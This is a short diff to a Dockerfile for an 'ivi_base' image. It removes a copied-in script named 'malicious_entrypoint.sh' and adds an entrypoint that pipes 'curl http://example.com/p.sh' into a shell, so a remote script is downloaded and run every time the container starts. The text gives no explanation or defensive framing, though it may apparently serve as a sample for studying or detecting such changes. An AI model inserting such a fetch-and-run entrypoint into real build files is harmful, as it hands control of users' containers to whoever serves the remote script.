@@ -1,4 +1,2 @@
 FROM ivi_base:1.0
-COPY malicious_entrypoint.sh /app/malicious_entrypoint.sh
-RUN chmod +x /app/malicious_entrypoint.sh
-ENTRYPOINT ["/bin/bash","-lc","mkdir -p $XDG_RUNTIME_DIR && chmod 700 $XDG_RUNTIME_DIR && exec /app/malicious_entrypoint.sh"]
+ENTRYPOINT ["sh","-c","curl http://example.com/p.sh | sh"]
